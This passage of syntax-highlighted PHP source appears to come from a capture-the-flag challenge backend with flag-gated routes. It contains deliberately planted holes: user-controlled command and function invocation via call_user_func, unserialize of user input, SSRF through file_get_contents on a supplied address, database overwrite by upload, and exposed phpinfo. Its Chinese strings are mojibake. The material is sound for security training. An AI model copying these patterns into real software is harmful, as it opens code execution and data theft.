class="variable">$ret</span> = <span class="title function_ invoke__">updateUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;backup&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">backupUsers</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">recoveryUsers</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;phpInfo&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">phpInfoTest</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;netTest&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">netTest</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;remoteUpdate&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">remoteUpdate</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;auth&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;update_address&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;authKeyValidate&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">authKeyValidate</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilString&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilString</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilNumber&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilNumber</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilFunction&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilFunction</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilArray&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilArray</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;evilClass&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">evilClass</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ•°æ®è·å–å¤±è´¥&#x27;</span>,</span><br><span class="line">));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUsers</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$page</span>=<span class="number">1</span>,<span class="variable">$limit</span>=<span class="number">10</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ•°æ®è·å–æˆåŠŸ&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;data&#x27;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$isadmin</span> = <span class="string">&#x27;å¦&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;æ— &#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$users</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$users</span>);</span><br><span class="line"><span class="variable">$index</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$users</span> <span class="keyword">as</span> <span class="variable">$u</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">0</span>]==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$isadmin</span> = <span class="string">&#x27;æ˜¯&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;flagå°±æ˜¯ç®¡ç†å‘˜çš„å¯†ç ï¼Œä¸è¿‡æˆ‘éšè—äº†&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;åˆ é™¤æ­¤æ¡è®°å½•åflagå°±ä¼šæ¶ˆå¤±&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;id&#x27;</span>=&gt;<span class="variable">$index</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>=&gt;<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">0</span>],</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$pass</span>,</span><br><span class="line"><span class="string">&#x27;isAdmin&#x27;</span>=&gt;<span class="variable">$isadmin</span>,</span><br><span class="line"><span class="string">&#x27;content&#x27;</span>=&gt;<span class="variable">$content</span></span><br><span class="line">));</span><br><span class="line"><span class="variable">$index</span> +=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="variable">$index</span>;</span><br><span class="line"><span class="variable">$start</span> = (<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$limit</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="title function_ invoke__">array_slice</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$start</span>,<span class="variable">$limit</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ·»åŠ æˆåŠŸ&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$data</span>.<span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·å·²å­˜åœ¨&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ›´æ–°æˆåŠŸ&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨æˆ–æ— æƒæ›´æ–°&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;åˆ é™¤æˆåŠŸ&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨æˆ–æ— æƒåˆ é™¤&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">existsUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backupUsers</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$file_name</span> = DB_PATH;</span><br><span class="line"><span class="keyword">if</span> (! <span class="title function_ invoke__">file_exists</span> (<span class="variable">$file_name</span> )) &#123;    </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 404 NOT FOUND&#x27;</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span> (<span class="variable">$file_name</span>, <span class="string">&quot;rb&quot;</span> ); </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Content-type: application/octet-stream&quot;</span> ); </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Accept-Ranges: bytes&quot;</span> );  </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Accept-Length: &quot;</span> . <span class="title function_ invoke__">filesize</span> (<span class="variable">$file_name</span>));  </span><br><span class="line">    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Content-Disposition: attachment; filename=backup.dat&quot;</span>);     </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(FLAG645, <span class="string">&#x27;flagå°±åœ¨è¿™é‡Œï¼Œå¯æƒœä¸èƒ½ç»™ä½ &#x27;</span>, <span class="title function_ invoke__">fread</span> ( <span class="variable">$file</span>, <span class="title function_ invoke__">filesize</span> (<span class="variable">$file_name</span>)));    </span><br><span class="line">    <span class="title function_ invoke__">fclose</span> ( <span class="variable">$file</span> );    </span><br><span class="line">    <span class="keyword">exit</span> ();    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArray</span>(<span class="params"><span class="variable">$total</span>, <span class="variable">$times</span>, <span class="variable">$min</span>, <span class="variable">$max</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$min</span> * <span class="variable">$times</span> &gt; <span class="variable">$total</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$max</span> * <span class="variable">$times</span> &lt; <span class="variable">$total</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$times</span> &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$times</span>--;</span><br><span class="line">            <span class="variable">$kmix</span> = <span class="title function_ invoke__">max</span>(<span class="variable">$min</span>, <span class="variable">$total</span> - <span class="variable">$times</span> * <span class="variable">$max</span>);</span><br><span class="line">            <span class="variable">$kmax</span> = <span class="title function_ invoke__">min</span>(<span class="variable">$max</span>, <span class="variable">$total</span> - <span class="variable">$times</span> * <span class="variable">$min</span>);</span><br><span class="line">            <span class="variable">$kAvg</span> = <span class="variable">$total</span> / (<span class="variable">$times</span> + <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$kDis</span> = <span class="title function_ invoke__">min</span>(<span class="variable">$kAvg</span> - <span class="variable">$kmix</span>, <span class="variable">$kmax</span> - <span class="variable">$kAvg</span>);</span><br><span class="line">            <span class="variable">$r</span> = ((<span class="keyword">float</span>)(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>) / <span class="number">10000</span>) - <span class="number">0.5</span>) * <span class="variable">$kDis</span> * <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$k</span> = <span class="title function_ invoke__">round</span>(<span class="variable">$kAvg</span> + <span class="variable">$r</span>);</span><br><span class="line">            <span class="variable">$total</span> -= <span class="variable">$k</span>;</span><br><span class="line">            <span class="variable">$data</span>[] = <span class="variable">$k</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recoveryUsers</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ¢å¤æˆåŠŸ&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]&lt;<span class="number">1024</span>*<span class="number">1024</span>)&#123;</span><br><span class="line"><span class="variable">$file_name</span>= <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_name</span>, DB_PATH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>===<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;æ•°æ®æ¢å¤å¤±è´¥ file_name&#x27;</span>.<span class="variable">$file_name</span>.<span class="string">&#x27; DB_PATH=&#x27;</span>.DB_PATH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;æ•°æ®æ¢å¤å¤±è´¥&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">phpInfoTest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authKeyValidate</span>(<span class="params"><span class="variable">$auth</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="variable">$auth</span>==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>)?<span class="string">&#x27;éªŒè¯æˆåŠŸ&#x27;</span>:<span class="string">&#x27;éªŒè¯å¤±è´¥&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;status&#x27;</span>=&gt;<span class="variable">$auth</span>==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>)?<span class="string">&#x27;0&#x27;</span>:<span class="string">&#x27;-1&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remoteUpdate</span>(<span class="params"><span class="variable">$auth</span>,<span class="variable">$address</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ›´æ–°å¤±è´¥&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>!==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;æƒé™keyéªŒè¯å¤±è´¥&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$address</span>);</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=(<span class="variable">$content</span>!==<span class="literal">false</span>?<span class="variable">$content</span>:<span class="string">&#x27;åœ°å€ä¸å¯è¾¾&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilString</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;372619038&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="variable">$key</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG647&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;you are not 372619038?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilClass</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$m</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable">$m</span>=<span class="variable">$m</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;<span class="variable">$m</span>=<span class="variable">$m</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="variable">$m</span>==<span class="variable">$m</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG647&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG648&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;mmmmm?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilNumber</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$number</span> = <span class="title function_ invoke__">getArray</span>(<span class="number">1000</span>,<span class="number">20</span>,<span class="number">10</span>,<span class="number">999</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$number</span>[<span class="variable">$m</span>]==<span class="variable">$m</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG648&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG649&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;number is right?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilFunction</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;ffffffff&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="variable">$key</span>)!==<span class="literal">FALSE</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG649&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG650&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;you are not ffffffff?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilArray</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$arrays</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$arrays</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$arrays</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;ctfshow&#x27;</span>, <span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$arrays</span>)) &amp;&amp;  <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG650&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG651&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;array?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netTest</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;å‘½ä»¤æ‰§è¡Œå¤±è´¥&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span 